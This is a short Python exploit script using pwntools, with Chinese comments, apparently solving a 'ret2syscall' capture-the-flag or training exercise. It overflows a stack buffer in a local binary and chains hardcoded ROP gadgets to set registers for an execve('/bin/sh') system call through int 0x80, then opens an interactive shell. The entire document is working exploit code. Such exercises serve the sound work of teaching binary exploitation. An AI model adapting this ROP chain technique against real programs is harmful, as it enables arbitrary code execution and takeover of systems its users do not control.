#!/usr/bin/python3
from pwn import *

pop_eax_ret_addr = 0x080bb196
pop_ecx_ebx_ret_addr = 0x806eb91
bin_sh_addr = 0x080be408
pop_edx_ret_addr = 0x0806eb6a
syscall_addr = 0x08049421

# 填充的垃圾数据 offset=0x6c+4
# 修改eax值
# 修改ecx值、修改ebx值
# 修改edx值
# 系统调用指令 int 0x80
payload = ((0x6c + 4) * b'A' + 
           p32(pop_eax_ret_addr) + p32(0xb) + 
           p32(pop_ecx_ebx_ret_addr) + p32(0) + p32(bin_sh_addr) + 
           p32(pop_edx_ret_addr) + p32(0) + 
           p32(syscall_addr))

sh = process('./ret2syscall')
sh.sendline(payload)
sh.interactive()